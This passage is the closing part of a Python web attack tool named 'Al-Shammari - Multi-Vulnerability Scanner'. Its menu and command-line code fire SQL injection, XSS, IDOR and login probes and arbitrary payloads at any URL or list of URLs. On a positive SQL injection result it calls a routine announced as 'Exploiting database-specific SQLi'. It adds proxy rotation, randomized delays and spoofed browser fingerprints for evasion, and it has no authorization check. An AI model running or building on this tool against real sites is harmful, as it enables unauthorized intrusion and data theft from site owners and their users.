                p=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            pres(s_sqli(u,param=p))
        elif ch=="3":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
                p=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            pres(s_xss(u,param=p))
        elif ch=="4":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            pres(s_idor(u))
        elif ch=="5":
            try:
                u=input(f"{C.CY}[?] Login URL: {C.X}").strip()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            pres(s_auth(u))
        elif ch=="6":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
                p=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            pres(s_extra(u,param=p))
        elif ch=="7":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
                pl=input(f"{C.CY}[?] Payload: {C.X}").strip()
                mt=input(f"{C.CY}[?] Method [GET]: {C.X}").strip().upper() or "GET"
                pm=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            rr=tpay(u,pl,mt,pm)
            if rr:
                inf(f"Status: {rr['s']} | Length: {rr['l']} | Time: {rr['t']:.2f}s")
                for e in det_err(rr["c"]): inf(f"  SQLi: {e['d']}")
                for x in det_xss(rr["c"],pl): inf(f"  XSS: {x['x']}")
        elif ch=="8":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
                print("\n  1. MSSQL  2. PostgreSQL  3. Oracle")
                db=input(f"{C.CY}[?] Database: {C.X}").strip()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            dm={"1":"mssql","2":"postgresql","3":"oracle"}
            try:
                pm=input(f"{C.CY}[?] Parameter (optional): {C.X}").strip() or None
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            rs=[]; pls=SQLI.get(dm.get(db,"mssql"),[])
            inf(f"Testing {dm.get(db,'mssql').upper()}...")
            for p in pls:
                rr=tpay(u,p,param=pm)
                if rr and det_err(rr["c"]):
                    vln(f"  {p[:50]}")
                    rs.append({"type":f"SQLi ({dm.get(db)})","severity":"high","param":pm or "N/A","payload":p,"status":rr["s"]})
            if rs:
                inf(f"  {C.R}Exploiting database-specific SQLi...{C.X}")
                exp_data=exp_sqli(u,"GET",pm,rs)
                for r in rs: r["exploit"]=exp_data
            pres(rs)
        elif ch=="9":
            try:
                u=input(f"{C.CY}[?] Target URL: {C.X}").strip()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            fp(u)
        elif ch=="10":
            try:
                fp2=input(f"{C.CY}[?] File path: {C.X}").strip()
            except KeyboardInterrupt:
                print(f"\n{C.Y}[!]{C.X} Interrupted by user")
                break
            if not os.path.exists(fp2): err("File not found"); continue
            with open(fp2) as f: us=[l.strip() for l in f if l.strip()]
            inf(f"Loaded {len(us)} URLs"); ar=[]
            for u in us:
                r,_=auto(u); ar.extend(r)
            pres(ar)
        elif ch=="0":
            inf("Goodbye!"); break
        else:
            err("Invalid option")
        try:
            input(f"\n{C.CY}Press Enter to continue...{C.X}")
        except KeyboardInterrupt:
            print(f"\n{C.Y}[!]{C.X} Interrupted by user")
            break

if __name__=="__main__":
    pa=argparse.ArgumentParser(description="Al-Shammari - Multi-Vulnerability Scanner")
    pa.add_argument("-u","--url"); pa.add_argument("-p","--payload")
    pa.add_argument("-m","--method",default="GET"); pa.add_argument("-P","--param")
    pa.add_argument("-t","--type",choices=["auto","sqli","xss","idor","auth","extra","fp"])
    pa.add_argument("-f","--file"); pa.add_argument("--menu",action="store_true")
    pa.add_argument("--proxy"); pa.add_argument("--proxy-file")
    pa.add_argument("--delay"); pa.add_argument("--no-delay",action="store_true")
    pa.add_argument("--cookies"); pa.add_argument("--fingerprint",choices=["chrome_win","chrome_mac","chrome_linux","firefox_win","firefox_mac","firefox_linux","safari_mac","edge_win"])
    ar=pa.parse_args()
    if ar.proxy: st.proxy=ar.proxy
    if ar.proxy_file:
        try:
            with open(ar.proxy_file) as f: st.proxies=[l.strip() for l in f if l.strip()]
            inf(f"Loaded {len(st.proxies)} proxies")
        except: err("Cannot load proxy file")
    if ar.fingerprint: st.fingerprint=ar.fingerprint
    if ar.delay:
        pt=ar.delay.split("-"); st.mind,st.maxd=float(pt[0]),float(pt[1])
        st._adaptive_delay_min,st._adaptive_delay_max=st.mind,st.maxd
    if ar.no_delay:
        st.no_delay=True
        st.mind=st.maxd=0
        st._adaptive_delay_min=st._adaptive_delay_max=0
    if ar.cookies:
        for p in ar.cookies.split(";"):
            if "=" in p: k,v=p.split("=",1); st.cookies[k.strip()]=v.strip()
    if ar.menu or (not ar.url and not ar.file): menu()
    elif ar.file:
        with open(ar.file) as f: us=[l.strip() for l in f if l.strip()]
        ar2=[]
        for u in us: r,_=auto(u); ar2.extend(r)
        pres(ar2)
    elif ar.url:
        if ar.payload:
            rr=tpay(ar.url,ar.payload,ar.method,ar.param)
            if rr:
                inf(f"Status: {rr['s']} | Length: {rr['l']} | Time: {rr['t']:.2f}s")
                for e in det_err(rr["c"]): inf(f"  SQLi: {e['d']}")
                for x in det_xss(rr["c"],ar.payload): inf(f"  XSS: {x['x']}")
        elif ar.type=="auto":
            r,_=auto(ar.url); pres(r)
        elif ar.type=="sqli": pres(s_sqli(ar.url,ar.method,ar.param))
        elif ar.type=="xss": pres(s_xss(ar.url,ar.method,ar.param))
        elif ar.type=="idor": pres(s_idor(ar.url,ar.method))
        elif ar.type=="auth": pres(s_auth(ar.url))
        elif ar.type=="extra": pres(s_extra(ar.url,ar.method,ar.param))
        elif ar.type=="fp": fp(ar.url)
